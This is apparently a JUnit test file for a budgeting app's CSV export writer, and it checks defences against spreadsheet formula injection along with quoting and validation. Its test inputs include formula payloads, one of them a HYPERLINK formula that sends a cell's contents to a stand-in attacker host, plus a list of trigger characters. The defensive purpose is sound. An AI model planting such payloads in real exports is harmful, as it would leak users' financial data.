package com.budgetowl.common.csv;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.budgetowl.common.csv.CsvWriter.Column;
import com.budgetowl.common.csv.CsvWriter.ColumnType;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.List;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.EnumSource;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * The CSV writer is the formula-injection control for every export (docs/features/reporting.md,
 * attack 3). These tests are what make that sentence true rather than described.
 */
class CsvWriterTest {

    private static final int BOM_LENGTH = 3;

    @ParameterizedTest(name = "a text cell starting with U+{0} is escaped")
    @ValueSource(
            strings = {
                "=", "+", "-", "@", "\t", "\r", "\n", "＝", "＋", "－", "＠", "﹦", "﹢", "﹣", "﹫", "−"
            })
    void escapesATextCellThatStartsWithAnyFormulaTrigger(String trigger) {
        String written = singleTextCell(trigger + "HYPERLINK(\"https://attacker.example/\")");

        assertThat(written)
                .isEqualTo("\"'" + trigger + "HYPERLINK(\"\"https://attacker.example/\"\")\"");
    }

    @ParameterizedTest(name = "a trigger behind leading U+{0} is still escaped")
    @ValueSource(strings = {" ", "  ", " ", "​", "﻿", " ", "　", "\u0001", "\u000B", " ​ "})
    void escapesATriggerHiddenBehindInvisibleOrBlankLeadingCharacters(String lead) {
        // A reader may trim these before parsing, so "=" behind them is still a formula. The value
        // is written exactly as given, with the ' in front of all of it.
        assertThat(CsvWriter.escapeFormula(lead + "=HYPERLINK(\"x\")"))
                .isEqualTo("'" + lead + "=HYPERLINK(\"x\")");
        assertThat(CsvWriter.escapeFormula(lead + "＋1")).isEqualTo("'" + lead + "＋1");
    }

    @Test
    void leavesLeadingBlanksBeforeAnOrdinaryCharacterAlone() {
        assertThat(CsvWriter.escapeFormula(" Groceries")).isEqualTo(" Groceries");
        assertThat(CsvWriter.escapeFormula(" Bills - utilities")).isEqualTo(" Bills - utilities");
        assertThat(CsvWriter.escapeFormula("   ")).isEqualTo("   ");
    }

    @Test
    void escapesTheClassicExfiltrationPayloadFromTheThreatModel() {
        String written = singleTextCell("=HYPERLINK(\"https://attacker.example/?\"&B2,\"Open\")");

        assertThat(written).startsWith("\"'=HYPERLINK(");
    }

    @Test
    void escapesACategoryNamedLikeANegativeNumberBecauseItIsText() {
        assertThat(singleTextCell("-5")).isEqualTo("\"'-5\"");
    }

    @Test
    void leavesANegativeAmountAloneBecauseTheDecisionIsTheColumnsNotTheValues() {
        String file =
                text(CsvWriter.withColumns(Column.amount("spending")).row("-5.0000").toBytes());

        assertThat(file).isEqualTo("\"spending\"\r\n\"-5.0000\"\r\n");
    }

    @Test
    void leavesTextThatStartsWithAnOrdinaryCharacterAlone() {
        assertThat(singleTextCell("Groceries")).isEqualTo("\"Groceries\"");
        assertThat(singleTextCell("5 a day")).isEqualTo("\"5 a day\"");
    }

    @Test
    void leavesATriggerCharacterAfterTheFirstAlone() {
        // A trigger character later in the value is not a formula, and a name with a hyphen in it
        // must be written exactly as the household typed it.
        assertThat(singleTextCell("Bills - utilities")).isEqualTo("\"Bills - utilities\"");
    }

    @Test
    void writesAnEmptyTextCellAsAnEmptyField() {
        assertThat(singleTextCell("")).isEqualTo("\"\"");
    }

    @Test
    void doublesEmbeddedQuotes() {
        assertThat(singleTextCell("The \"good\" café")).isEqualTo("\"The \"\"good\"\" café\"");
    }

    @Test
    void keepsANewlineInsideANameWithinOneQuotedField() {
        String file =
                text(
                        CsvWriter.withColumns(Column.text("category"), Column.amount("spending"))
                                .row("Line one\nLine two", "1.0000")
                                .toBytes());

        assertThat(file)
                .isEqualTo("\"category\",\"spending\"\r\n\"Line one\nLine two\",\"1.0000\"\r\n");
    }

    @Test
    void startsTheFileWithAUtf8ByteOrderMark() {
        byte[] file = CsvWriter.withColumns(Column.text("category")).row("Café").toBytes();

        assertThat(Arrays.copyOf(file, BOM_LENGTH))
                .containsExactly((byte) 0xEF, (byte) 0xBB, (byte) 0xBF);
        assertThat(text(file)).contains("Café");
    }

    @Test
    void writesTheHeaderCodesAsTheFirstRecordAndEndsEveryRecordInCrlf() {
        String file =
                text(
                        CsvWriter.withColumns(
                                        Column.currency("currency"),
                                        Column.period("period"),
                                        Column.amount("kept"),
                                        Column.bool("complete"))
                                .row("GBP", "2026-08", "851.2000", "true")
                                .row("GBP", "2026-09", "-12.0000", "false")
                                .toBytes());

        assertThat(file)
                .isEqualTo(
                        "\"currency\",\"period\",\"kept\",\"complete\"\r\n"
                                + "\"GBP\",\"2026-08\",\"851.2000\",\"true\"\r\n"
                                + "\"GBP\",\"2026-09\",\"-12.0000\",\"false\"\r\n");
    }

    @Test
    void writesANullInAnyColumnAsAnEmptyField() {
        String file =
                text(
                        CsvWriter.withColumns(Column.ratio("change"), Column.text("parent"))
                                .row(Arrays.asList(null, null))
                                .toBytes());

        assertThat(file).endsWith("\r\n\"\",\"\"\r\n");
    }

    @Test
    void writesAHeaderOnlyFileWhenThereAreNoRows() {
        assertThat(text(CsvWriter.withColumns(Column.text("category")).toBytes()))
                .isEqualTo("\"category\"\r\n");
    }

    @ParameterizedTest(name = "{0} refuses a value that does not match its pattern")
    @EnumSource(
            value = ColumnType.class,
            names = {"AMOUNT", "RATIO", "PERIOD", "CURRENCY", "COUNT", "BOOLEAN", "CODE"})
    void failsLoudlyWhenATypedColumnIsGivenSomethingElse(ColumnType type) {
        CsvWriter csv = CsvWriter.withColumns(new Column("cell", type));

        assertThatThrownBy(() -> csv.row("=HYPERLINK(\"x\")"))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("cell")
                .hasMessageNotContaining("HYPERLINK");
    }

    @Test
    void refusesAnAmountThatIsNotAtScaleFour() {
        CsvWriter csv = CsvWriter.withColumns(Column.amount("spending"));

        assertThatThrownBy(() -> csv.row("-5")).isInstanceOf(IllegalArgumentException.class);
        assertThatThrownBy(() -> csv.row("-5.00")).isInstanceOf(IllegalArgumentException.class);
        assertThatThrownBy(() -> csv.row("1E+3")).isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    void refusesAPeriodOrCurrencyThatOnlyLooksRight() {
        assertThatThrownBy(() -> CsvWriter.withColumns(Column.period("period")).row("+10000-01"))
                .isInstanceOf(IllegalArgumentException.class);
        assertThatThrownBy(() -> CsvWriter.withColumns(Column.currency("currency")).row("gbp"))
                .isInstanceOf(IllegalArgumentException.class);
        assertThatThrownBy(() -> CsvWriter.withColumns(Column.count("count")).row("-1"))
                .isInstanceOf(IllegalArgumentException.class);
        assertThatThrownBy(() -> CsvWriter.withColumns(Column.code("row")).row("-CATEGORY"))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    void acceptsEveryTypedShapeItDocuments() {
        String file =
                text(
                        CsvWriter.withColumns(
                                        Column.amount("a"),
                                        Column.ratio("r"),
                                        Column.period("p"),
                                        Column.currency("c"),
                                        Column.count("n"),
                                        Column.bool("b"),
                                        Column.code("k"))
                                .row(
                                        "-1234.5000",
                                        "0.1602",
                                        "2026-08",
                                        "EUR",
                                        "12",
                                        "false",
                                        "UNCATEGORISED")
                                .toBytes());

        assertThat(file)
                .endsWith(
                        "\"-1234.5000\",\"0.1602\",\"2026-08\",\"EUR\",\"12\",\"false\","
                                + "\"UNCATEGORISED\"\r\n");
    }

    @Test
    void refusesARecordWithTheWrongNumberOfFields() {
        CsvWriter csv = CsvWriter.withColumns(Column.text("a"), Column.text("b"));

        assertThatThrownBy(() -> csv.row("only one"))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("2")
                .hasMessageNotContaining("only one");
    }

    @Test
    void refusesAHeaderThatIsProseRatherThanACode() {
        assertThatThrownBy(() -> Column.text("Needs a category"))
                .isInstanceOf(IllegalArgumentException.class);
        assertThatThrownBy(() -> Column.text("=cmd")).isInstanceOf(IllegalArgumentException.class);
        assertThatThrownBy(() -> Column.text("")).isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    void refusesAFileWithNoColumns() {
        assertThatThrownBy(() -> CsvWriter.withColumns(List.of()))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    void exposesTheSameEscapeForAnExportWithItsOwnFraming() {
        assertThat(CsvWriter.escapeFormula("@SUM(A1)")).isEqualTo("'@SUM(A1)");
        assertThat(CsvWriter.escapeFormula("－1")).isEqualTo("'－1");
        assertThat(CsvWriter.escapeFormula("Rent")).isEqualTo("Rent");
        assertThat(CsvWriter.escapeFormula("")).isEmpty();
    }

    @Test
    void printsItsShapeAndNeverAValue() {
        CsvWriter csv =
                CsvWriter.withColumns(Column.text("category"), Column.amount("spending"))
                        .row("Therapy", "120.0000");

        assertThat(csv.toString())
                .isEqualTo("CsvWriter[columns=2, rows=1]")
                .doesNotContain("Therapy")
                .doesNotContain("120");
    }

    /** One text column, one row; returns that row's field as written. */
    private static String singleTextCell(String value) {
        String file = text(CsvWriter.withColumns(Column.text("category")).row(value).toBytes());
        String header = "\"category\"\r\n";
        assertThat(file).startsWith(header).endsWith("\r\n");
        return file.substring(header.length(), file.length() - 2);
    }

    private static String text(byte[] file) {
        return new String(file, BOM_LENGTH, file.length - BOM_LENGTH, StandardCharsets.UTF_8);
    }
}
